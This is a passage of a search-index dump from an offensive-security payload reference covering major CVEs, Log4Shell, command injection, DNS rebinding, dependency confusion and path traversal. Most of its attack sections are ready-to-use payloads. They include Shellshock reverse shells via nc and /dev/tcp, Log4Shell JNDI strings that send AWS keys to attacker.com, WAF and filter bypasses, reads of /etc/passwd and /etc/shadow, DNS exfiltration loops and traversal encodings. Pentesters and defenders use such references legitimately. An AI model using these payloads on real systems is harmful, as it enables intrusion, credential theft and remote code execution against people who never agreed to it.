Mauer</li> <li>Three New DDE Obfuscation Methods</li> <li>Your Excel Sheets Are Not Safe! Here's How to Beat CSV Injection</li> </ul>"},{"location":"CVE%20Exploits/","title":"Common Vulnerabilities and Exposures","text":""},{"location":"CVE%20Exploits/#tools","title":"Tools","text":"<ul> <li>Trickest CVE Repository - Automated collection of CVEs and PoC's</li> <li>Nuclei Templates - Community curated list of templates for the nuclei engine to find security vulnerabilities in applications</li> <li>Metasploit Framework</li> <li>CVE Details - The ultimate security vulnerability datasource</li> </ul>"},{"location":"CVE%20Exploits/#big-cves-in-the-last-5-years","title":"Big CVEs in the last 5 years.","text":""},{"location":"CVE%20Exploits/#cve-2017-0144-eternalblue","title":"CVE-2017-0144 - EternalBlue","text":"<p>EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.</p> <p>Afftected systems: - Windows Vista SP2 - Windows Server 2008 SP2 and R2 SP1 - Windows 7 SP1 - Windows 8.1 - Windows Server 2012 Gold and R2 - Windows RT 8.1 - Windows 10 Gold, 1511, and 1607 - Windows Server 2016</p>"},{"location":"CVE%20Exploits/#cve-2017-5638-apache-struts-2","title":"CVE-2017-5638 - Apache Struts 2","text":"<p>On March 6th, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This recent vulnerability, CVE-2017-5638, allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header.</p>"},{"location":"CVE%20Exploits/#cve-2018-7600-drupalgeddon-2","title":"CVE-2018-7600 - Drupalgeddon 2","text":"<p>A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.</p>"},{"location":"CVE%20Exploits/#cve-2019-0708-bluekeep","title":"CVE-2019-0708 - BlueKeep","text":"<p>A remote code execution vulnerability exists in Remote Desktop Services \u2013 formerly known as Terminal Services \u2013 when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.</p>"},{"location":"CVE%20Exploits/#cve-2019-19781-citrix-adc-netscaler","title":"CVE-2019-19781 -  Citrix ADC Netscaler","text":"<p>A remote code execution vulnerability in Citrix Application Delivery Controller (ADC) formerly known as NetScaler ADC and Citrix Gateway formerly known as NetScaler Gateway that, if exploited, could allow an unauthenticated attacker to perform arbitrary code execution.</p> <p>Affected products: - Citrix ADC and Citrix Gateway version 13.0 all supported builds - Citrix ADC and NetScaler Gateway version 12.1 all supported builds - Citrix ADC and NetScaler Gateway version 12.0 all supported builds - Citrix ADC and NetScaler Gateway version 11.1 all supported builds - Citrix NetScaler ADC and NetScaler Gateway version 10.5 all supported builds</p>"},{"location":"CVE%20Exploits/#older-but-not-forgotten","title":"Older, but not forgotten","text":""},{"location":"CVE%20Exploits/#cve-2014-0160-heartbleed","title":"CVE-2014-0160 - Heartbleed","text":"<p>The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet. SSL/TLS provides communication security and privacy over the Internet for applications such as web, email, instant messaging (IM) and some virtual private networks (VPNs).</p>"},{"location":"CVE%20Exploits/#cve-2014-6271-shellshock","title":"CVE-2014-6271 - Shellshock","text":"<p>Shellshock, also known as Bashdoor is a family of security bug in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.</p> <pre><code>echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\\r\\n\"\ncurl --silent -k -H \"User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1\" \"https://10.0.0.1/cgi-bin/admin.cgi\" \n</code></pre>"},{"location":"CVE%20Exploits/#thanks-to","title":"Thanks to","text":"<ul> <li>Heartbleed - Official website</li> <li>Shellshock - Wikipedia</li> <li>Imperva Apache Struts analysis</li> <li>EternalBlue - Wikipedia</li> <li>BlueKeep - Microsoft</li> </ul>"},{"location":"CVE%20Exploits/Log4Shell/","title":"CVE-2021-44228 Log4Shell","text":"<p>Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled</p>"},{"location":"CVE%20Exploits/Log4Shell/#summary","title":"Summary","text":"<ul> <li>Vulnerable code</li> <li>Payloads</li> <li>Scanning</li> <li>WAF Bypass</li> <li>Exploitation<ul> <li>Environment variables exfiltration</li> <li>Remote Command Execution</li> </ul> </li> <li>References</li> </ul>"},{"location":"CVE%20Exploits/Log4Shell/#vulnerable-code","title":"Vulnerable code","text":"<p>You can reproduce locally with: <code>docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app</code> using christophetd/log4shell-vulnerable-app or leonjza/log4jpwn <pre><code>public String index(@RequestHeader(\"X-Api-Version\") String apiVersion) {\nlogger.info(\"Received a request for API version \" + apiVersion);\nreturn \"Hello, world!\";\n}\n</code></pre></p>"},{"location":"CVE%20Exploits/Log4Shell/#payloads","title":"Payloads","text":"<pre><code># Identify Java version and hostname\n${jndi:ldap://${java:version}.domain/a}\n${jndi:ldap://${env:JAVA_VERSION}.domain/a}\n${jndi:ldap://${sys:java.version}.domain/a}\n${jndi:ldap://${sys:java.vendor}.domain/a}\n${jndi:ldap://${hostName}.domain/a}\n${jndi:dns://${hostName}.domain}\n# More enumerations keywords and variables\njava:os\ndocker:containerId\nweb:rootDir\nbundle:config:db.password\n</code></pre>"},{"location":"CVE%20Exploits/Log4Shell/#scanning","title":"Scanning","text":"<ul> <li>log4j-scan <pre><code>usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing]\n[--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST]\npython3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test\npython3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass\n</code></pre></li> <li>Nuclei Template</li> </ul>"},{"location":"CVE%20Exploits/Log4Shell/#waf-bypass","title":"WAF Bypass","text":"<pre><code>${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}\n# using lower and upper\n${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}\n${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}\n${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}\n# using env to create the letter\n${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}\n${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}\n</code></pre>"},{"location":"CVE%20Exploits/Log4Shell/#exploitation","title":"Exploitation","text":""},{"location":"CVE%20Exploits/Log4Shell/#environment-variables-exfiltration","title":"Environment variables exfiltration","text":"<pre><code>${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/\n# AWS Access Key\n${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}\n</code></pre>"},{"location":"CVE%20Exploits/Log4Shell/#remote-command-execution","title":"Remote Command Execution","text":"<ul> <li>rogue-jndi - @artsploit <pre><code>java -jar target/RogueJndi-1.1.jar --command \"touch /tmp/toto\" --hostname \"192.168.1.21\"\nMapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference\nMapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference\nMapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat\nMapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy\nMapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1\nMapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1\nMapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2\nMapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2\n</code></pre></li> <li>JNDI-Exploit-Kit - @pimps</li> </ul>"},{"location":"CVE%20Exploits/Log4Shell/#references","title":"References","text":"<ul> <li>Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package - December 12, 2021</li> <li>Log4Shell Update: Second log4j Vulnerability Published (CVE-2021-44228 + CVE-2021-45046) - December 14, 2021</li> <li>PSA: Log4Shell and the current state of JNDI injection - December 10, 2021</li> </ul>"},{"location":"Command%20Injection/","title":"Command Injection","text":"<p>Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.</p>"},{"location":"Command%20Injection/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploits</li> <li>Basic commands</li> <li>Chaining commands</li> <li>Inside a command</li> <li>Filter Bypasses</li> <li>Bypass without space</li> <li>Bypass with a line return</li> <li>Bypass with backslash newline</li> <li>Bypass characters filter via hex encoding</li> <li>Bypass blacklisted words</li> <li>Bypass with single quote</li> <li>Bypass with double quote</li> <li>Bypass with backslash and slash</li> <li>Bypass with $@</li> <li>Bypass with $()</li> <li>Bypass with variable expansion</li> <li>Bypass with wildcards</li> <li>Challenge</li> <li>Time based data exfiltration</li> <li>DNS based data exfiltration</li> <li>Polyglot command injection</li> <li>Backgrounding long running commands</li> <li>References</li> </ul>"},{"location":"Command%20Injection/#tools","title":"Tools","text":"<ul> <li>commix - Automated All-in-One OS command injection and exploitation tool</li> </ul>"},{"location":"Command%20Injection/#exploits","title":"Exploits","text":""},{"location":"Command%20Injection/#basic-commands","title":"Basic commands","text":"<p>Execute the command and voila :p</p> <pre><code>cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\n</code></pre>"},{"location":"Command%20Injection/#chaining-commands","title":"Chaining commands","text":"<pre><code>original_cmd_by_server; ls\noriginal_cmd_by_server &amp;&amp; ls\noriginal_cmd_by_server | ls\noriginal_cmd_by_server || ls   # Only if the first cmd fail\n</code></pre> <p>Commands can also be run in sequence with newlines</p> <pre><code>original_cmd_by_server\nls\n</code></pre>"},{"location":"Command%20Injection/#inside-a-command","title":"Inside a command","text":"<pre><code>original_cmd_by_server `cat /etc/passwd`\noriginal_cmd_by_server $(cat /etc/passwd)\n</code></pre>"},{"location":"Command%20Injection/#filter-bypasses","title":"Filter Bypasses","text":""},{"location":"Command%20Injection/#bypass-without-space","title":"Bypass without space","text":"<p>Works on Linux only.</p> <pre><code>swissky@crashlab:~/Www$ cat&lt;/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nswissky@crashlab:~$ {cat,/etc/passwd}\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nswissky@crashlab:~$ cat$IFS/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nswissky@crashlab:~$ echo${IFS}\"RCE\"${IFS}&amp;&amp;cat${IFS}/etc/passwd\nRCE\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nswissky@crashlab:~$ X=$'uname\\x20-a'&amp;&amp;$X\nLinux crashlab 4.4.X-XX-generic #72-Ubuntu\nswissky@crashlab:~$ sh&lt;/dev/tcp/127.0.0.1/4242\n</code></pre> <p>Commands execution without spaces, $ or { } - Linux (Bash only)</p> <pre><code>IFS=,;`cat&lt;&lt;&lt;uname,-a`\n</code></pre> <p>Tabs work as separators in web apps where spaces are removed.</p> <pre><code>;ls%09-al%09/home\ndrwxr-xr-x  4 root root  4096 Jan 10 13:34 .\ndrwxr-xr-x 18 root root  4096 Jan 10 13:33 ..\ndrwx------  2 root root 16384 Jan 10 13:31 lost+found\ndrwxr-xr-x  4 test test  4096 Jan 13 08:30 test\n</code></pre> <p>Works on Windows only.</p> <pre><code>ping%CommonProgramFiles:~10,-18%IP\nping%PROGRAMFILES:~10,-5%IP\n</code></pre>"},{"location":"Command%20Injection/#bypass-with-a-line-return","title":"Bypass with a line return","text":"<pre><code>something%0Acat%20/etc/passwd\n</code></pre> <p>You can also write files.</p> <pre><code>;cat&gt;/tmp/hi&lt;&lt;EOF%0ahello%0aEOF\n;cat&lt;/tmp/hi\nhello\n</code></pre>"},{"location":"Command%20Injection/#bypass-with-backslash-newline","title":"Bypass with backslash newline","text":"<p>Commands can be broken into parts by using backslash followed by a newline <pre><code>\u276f cat /et\\\nc/pa\\\nsswd\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n[SNIP]\n</code></pre> URL encoded form would look like this: <pre><code>cat%20/et%5C%0Ac/pa%5C%0Asswd\n</code></pre></p>"},{"location":"Command%20Injection/#bypass-characters-filter-via-hex-encoding","title":"Bypass characters filter via hex encoding","text":"<p>Linux</p> <pre><code>swissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n/etc/passwd\nswissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"`\nroot:x:0:0:root:/root:/bin/bash\nswissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc\nroot:x:0:0:root:/root:/bin/bash\nswissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`\nroot:x:0:0:root:/root:/bin/bash\nswissky@crashlab:~$ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764\n/etc/passwd\nswissky@crashlab:~$ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`\nroot:x:0:0:root:/root:/bin/bash\nswissky@crashlab:~$ xxd -r -ps &lt;(echo 2f6574632f706173737764)\n/etc/passwd\nswissky@crashlab:~$ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"Command%20Injection/#bypass-characters-filter","title":"Bypass characters filter","text":"<p>Commands execution without backslash and slash - linux bash</p> <pre><code>swissky@crashlab:~$ echo ${HOME:0:1}\n/\nswissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd\nroot:x:0:0:root:/root:/bin/bash\nswissky@crashlab:~$ echo . | tr '!-0' '\"-1'\n/\nswissky@crashlab:~$ tr '!-0' '\"-1' &lt;&lt;&lt; .\n/\nswissky@crashlab:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"Command%20Injection/#bypass-blacklisted-words","title":"Bypass Blacklisted words","text":""},{"location":"Command%20Injection/#bypass-with-single-quote","title":"Bypass with single quote","text":"<pre><code>w'h'o'am'i\n</code></pre>"},{"location":"Command%20Injection/#bypass-with-double-quote","title":"Bypass with double quote","text":"<pre><code>w\"h\"o\"am\"i\n</code></pre>"},{"location":"Command%20Injection/#bypass-with-backslash-and-slash","title":"Bypass with backslash and slash","text":"<pre><code>w\\ho\\am\\i\n/\\b\\i\\n/////s\\h\n</code></pre>"},{"location":"Command%20Injection/#bypass-with","title":"Bypass with $@","text":"<pre><code>who$@ami\necho $0\n-&gt; /usr/bin/zsh\necho whoami|$0\n</code></pre>"},{"location":"Command%20Injection/#bypass-with_1","title":"Bypass with $()","text":"<pre><code>who$()ami\nwho$(echo am)i\nwho`echo am`i\n</code></pre>"},{"location":"Command%20Injection/#bypass-with-variable-expansion","title":"Bypass with variable expansion","text":"<pre><code>/???/??t /???/p??s??\ntest=/ehhh/hmtc/pahhh/hmsswd\ncat ${test//hhh\\/hm/}\ncat ${test//hh??hm/}\n</code></pre>"},{"location":"Command%20Injection/#bypass-with-wildcards","title":"Bypass with wildcards","text":"<pre><code>powershell C:\\*\\*2\\n??e*d.*? # notepad\n@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc\n</code></pre>"},{"location":"Command%20Injection/#challenge","title":"Challenge","text":"<p>Challenge based on the previous tricks, what does the following command do:</p> <pre><code>g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@&lt;${g//hh??hm/}\n</code></pre>"},{"location":"Command%20Injection/#time-based-data-exfiltration","title":"Time based data exfiltration","text":"<p>Extracting data : char by char</p> <pre><code>swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\nreal    0m5.007s\nuser    0m0.000s\nsys 0m0.000s\nswissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi\nreal    0m0.002s\nuser    0m0.000s\nsys 0m0.000s\n</code></pre>"},{"location":"Command%20Injection/#dns-based-data-exfiltration","title":"DNS based data exfiltration","text":"<p>Based on the tool from <code>https://github.com/HoLyVieR/dnsbin</code> also hosted at dnsbin.zhack.ca</p> <pre><code>1. Go to http://dnsbin.zhack.ca/\n2. Execute a simple 'ls'\nfor i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done\n</code></pre> <pre><code>$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)\n</code></pre> <p>Online tools to check for DNS based data exfiltration:</p> <ul> <li>dnsbin.zhack.ca</li> <li>pingb.in</li> </ul>"},{"location":"Command%20Injection/#polyglot-command-injection","title":"Polyglot command injection","text":"<pre><code>1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\ne.g:\necho 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\necho '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\necho \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n</code></pre> <pre><code>/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n\ne.g:\necho 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\necho \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"\necho 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'\n</code></pre>"},{"location":"Command%20Injection/#backgrounding-long-running-commands","title":"Backgrounding long running commands","text":"<p>In some instances, you might have a long running command that gets killed by the process injecting it timing out.</p> <p>Using nohup, you can keep the process running after the parent process exits.</p> <pre><code>nohup sleep 120 &gt; /dev/null &amp;\n</code></pre>"},{"location":"Command%20Injection/#labs","title":"Labs","text":"<ul> <li>OS command injection, simple case</li> <li>Blind OS command injection with time delays</li> <li>Blind OS command injection with output redirection</li> <li>Blind OS command injection with out-of-band interaction</li> <li>Blind OS command injection with out-of-band data exfiltration</li> </ul>"},{"location":"Command%20Injection/#references","title":"References","text":"<ul> <li>SECURITY CAF\u00c9 - Exploiting Timed Based RCE</li> <li>Bug Bounty Survey - Windows RCE spaceless</li> <li>No PHP, no spaces, no $, no { }, bash only - @asdizzle</li> <li>#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware</li> <li>What is OS command injection - portswigger</li> </ul>"},{"location":"DNS%20Rebinding/","title":"DNS Rebinding","text":"<p>DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses.</p>"},{"location":"DNS%20Rebinding/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploitation</li> <li>Protection Bypasses</li> </ul>"},{"location":"DNS%20Rebinding/#tools","title":"Tools","text":"<ul> <li>Singularity of Origin - is a tool to perform DNS rebinding attacks.</li> <li>Singularity of Origin Web Client (manager interface, port scanner and autoattack)</li> </ul>"},{"location":"DNS%20Rebinding/#exploitation","title":"Exploitation","text":"<p>First, we need to make sure that the targeted service is vulnerable to DNS rebinding. It can be done with a simple curl request:</p> <pre><code>curl --header 'Host: &lt;arbitrary-hostname&gt;' http://&lt;vulnerable-service&gt;:8080\n</code></pre> <p>If the server returns the expected result (e.g. the regular web page) then the service is vulnerable. If the server returns an error message (e.g. 404 or similar), the server has most likely protections implemented which prevent DNS rebinding attacks.</p> <p>Then, if the service is vulnerable, we can abuse DNS rebinding by following these steps:</p> <ol> <li>Register a domain.</li> <li>Setup Singularity of Origin.</li> <li>Edit the autoattack HTML page for your needs.</li> <li>Browse to \"http://rebinder.your.domain:8080/autoattack.html\".</li> <li>Wait for the attack to finish (it can take few seconds/minutes).</li> </ol>"},{"location":"DNS%20Rebinding/#protection-bypasses","title":"Protection Bypasses","text":"<p>Most DNS protections are implemented in the form of blocking DNS responses containing unwanted IP addresses at the perimeter, when DNS responses enter the internal network. The most common form of protection is to block private IP addresses as defined in RFC 1918 (i.e. 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). Some tools allow to additionally block localhost (127.0.0.0/8), local (internal) networks, or 0.0.0.0/0 network ranges.</p> <p>In the case where DNS protection are enabled (generally disabled by default), NCC Group has documented multiple DNS protection bypasses that can be used.</p>"},{"location":"DNS%20Rebinding/#0000","title":"0.0.0.0","text":"<p>We can use the IP address 0.0.0.0 to access the localhost (127.0.0.1) to bypass filters blocking DNS responses containing 127.0.0.1 or 127.0.0.0/8.</p>"},{"location":"DNS%20Rebinding/#cname","title":"CNAME","text":"<p>We can use DNS CNAME records to bypass a DNS protection solution that blocks all internal IP addresses. Since our response will only return a CNAME of an internal server, the rule filtering internal IP addresses will not be applied. Then, the local, internal DNS server will resolve the CNAME.</p> <pre><code>$ dig cname.example.com +noall +answer\n; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.15-Ubuntu &lt;&lt;&gt;&gt; example.com +noall +answer\n;; global options: +cmd\ncname.example.com.            381     IN      CNAME   target.local.\n</code></pre>"},{"location":"DNS%20Rebinding/#localhost","title":"localhost","text":"<p>We can use \"localhost\" as a DNS CNAME record to bypass filters blocking DNS responses containing 127.0.0.1.</p> <pre><code>$ dig www.example.com +noall +answer\n; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.15-Ubuntu &lt;&lt;&gt;&gt; example.com +noall +answer\n;; global options: +cmd\nlocalhost.example.com.            381     IN      CNAME   localhost.\n</code></pre>"},{"location":"DNS%20Rebinding/#references","title":"References","text":"<ul> <li>How Do DNS Rebinding Attacks Work? - nccgroup, 2019</li> </ul>"},{"location":"Dependency%20Confusion/","title":"Dependency Confusion","text":"<p>A dependency confusion attack or supply chain substitution attack occurs when a software installer script is tricked into pulling a malicious code file from a public repository instead of the intended file of the same name from an internal repository.</p>"},{"location":"Dependency%20Confusion/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploit</li> <li>References</li> </ul>"},{"location":"Dependency%20Confusion/#tools","title":"Tools","text":"<ul> <li>Confused</li> </ul>"},{"location":"Dependency%20Confusion/#exploit","title":"Exploit","text":"<p>Look for <code>npm</code>, <code>pip</code>, <code>gem</code> packages, the methodology is the same : you register a public package with the same name of private one used by the company and then you wait for it to be used.</p>"},{"location":"Dependency%20Confusion/#npm-example","title":"NPM example","text":"<ul> <li>List all the packages (ie: package.json, composer.json, ...)</li> <li>Find the package missing from https://www.npmjs.com/</li> <li>Register and create a public package with the same name<ul> <li>Package example : https://github.com/0xsapra/dependency-confusion-expoit</li> </ul> </li> </ul>"},{"location":"Dependency%20Confusion/#references","title":"References","text":"<ul> <li>Exploiting Dependency Confusion - 2 Jul 2021 - 0xsapra</li> <li>Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies - Alex Birsan - 9 Feb 2021</li> <li>Ways to Mitigate Risk When Using Private Package Feeds - Microsoft - 29/03/2021</li> <li>$130,000+ Learn New Hacking Technique in 2021 - Dependency Confusion - Bug Bounty Reports Explained</li> </ul>"},{"location":"Directory%20Traversal/","title":"Directory Traversal","text":"<p>A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing \"traverse to parent directory\" are passed through to the file APIs.</p>"},{"location":"Directory%20Traversal/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Basic exploitation<ul> <li>16 bits Unicode encoding</li> <li>UTF-8 Unicode encoding</li> <li>Bypass \"../\" replaced by \"\"</li> <li>Bypass \"../\" with \";\"</li> <li>Double URL encoding</li> <li>UNC Bypass</li> <li>NGINX/ALB Bypass</li> </ul> </li> <li>Path Traversal<ul> <li>Interesting Linux files</li> <li>Interesting Windows files</li> </ul> </li> <li>References</li> </ul>"},{"location":"Directory%20Traversal/#tools","title":"Tools","text":"<ul> <li>dotdotpwn - https://github.com/wireghoul/dotdotpwn <pre><code>git clone https://github.com/wireghoul/dotdotpwn\nperl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b\n</code></pre></li> </ul>"},{"location":"Directory%20Traversal/#basic-exploitation","title":"Basic exploitation","text":"<p>We can use the <code>..</code> characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.</p> <pre><code>../\n..\\\n..\\/\n%2e%2e%2f\n%252e%252e%252f\n%c0%ae%c0%ae%c0%af\n%uff0e%uff0e%u2215\n%uff0e%uff0e%u2216\n</code></pre>"},{"location":"Directory%20Traversal/#16-bits-unicode-encoding","title":"16 bits Unicode encoding","text":"<pre><code>. = %u002e\n/ = %u2215\n\\ = %u2216\n</code></pre>"},{"location":"Directory%20Traversal/#utf-8-unicode-encoding","title":"UTF-8 Unicode encoding","text":"<pre><code>. = %c0%2e, %e0%40%ae, %c0ae\n/ = %c0%af, %e0%80%af, %c0%2f\n\\ = %c0%5c, %c0%80%5c\n</code></pre>"},{"location":"Directory%20Traversal/#bypass-replaced-by","title":"Bypass \"../\" replaced by \"\"","text":"<p>Sometimes you encounter a WAF which remove the \"../\" characters from the strings, just duplicate them.</p> <pre><code>..././\n...\\.\\\n</code></pre>"},{"location":"Directory%20Traversal/#bypass-with","title":"Bypass \"../\" with \";\"","text":"<pre><code>..;/\nhttp://domain.tld/page.jsp?include=..;/..;/sensitive.txt \n</code></pre>"},{"location":"Directory%20Traversal/#double-url-encoding","title":"Double URL encoding","text":"<pre><code>. = %252e\n/ = %252f\n\\ = %255c\n</code></pre> <p>e.g: Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with <code>http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini</code></p>"},{"location":"Directory%20Traversal/#unc-bypass","title":"UNC Bypass","text":"<p>An attacker can inject a Windows UNC share ('\\UNC\\share\\name') into a software system to potentially redirect access to an unintended location or arbitrary file.</p> <pre><code>\\\\localhost\\c$\\windows\\win.ini\n</code></pre>"},{"location":"Directory%20Traversal/#nginxalb-bypass","title":"NGINX/ALB Bypass","text":"<p>NGINX in certain configurations and ALB can block traversal attacks in the route, For example: <code>http://nginx-server/../../</code> will return a 400 bad request.</p> <p>To bypass this behaviour just add forward slashes in front of the url: <code>http://nginx-server////////../../</code></p>"},{"location":"Directory%20Traversal/#java-bypass","title":"Java Bypass","text":"<p>Bypass Java's URL protocol</p> <pre><code>url:file:///etc/passwd\nurl:http://127.0.0.1:8080\n</code></pre>"},{"location":"Directory%20Traversal/#path-traversal","title":"Path Traversal","text":""},{"location":"Directory%20Traversal/#interesting-linux-files","title":"Interesting Linux files","text":"<pre><code>/etc/issue\n/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hosts\n/etc/motd\n/etc/mysql/my.cnf\n/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the 